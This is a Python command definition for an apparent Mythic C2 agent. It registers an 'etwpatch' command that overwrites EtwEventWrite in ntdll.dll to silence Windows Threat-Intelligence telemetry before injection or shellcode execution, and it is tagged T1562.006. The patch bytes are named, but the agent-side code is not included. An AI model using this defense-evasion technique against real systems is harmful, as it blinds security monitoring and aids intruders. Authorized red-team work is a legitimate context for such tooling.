from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class EtwpatchArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                choices=["patch", "unpatch"],
                default_value="patch",
                description="patch: xor eax,eax;ret on EtwEventWrite (silences ETW MWTI). unpatch: restore original bytes.",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default", ui_position=0, required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == '{':
            self.load_args_from_json_string(self.command_line)


class EtwpatchCommand(CommandBase):
    cmd = "etwpatch"
    needs_admin = False
    help_cmd = "etwpatch -action patch|unpatch"
    description = (
        "Patch EtwEventWrite in ntdll.dll (xor eax,eax; ret) to silence "
        "ETW Microsoft-Windows-Threat-Intelligence telemetry before noisy operations "
        "(injection, shellcode execution). Use 'unpatch' to restore original bytes."
    )
    version = 1
    author = "@0xbbuddha"
    argument_class = EtwpatchArguments
    attackmapping = ["T1562.006"]
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        action = taskData.args.get_arg("action") or "patch"
        response.DisplayParams = f"action={action}"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass
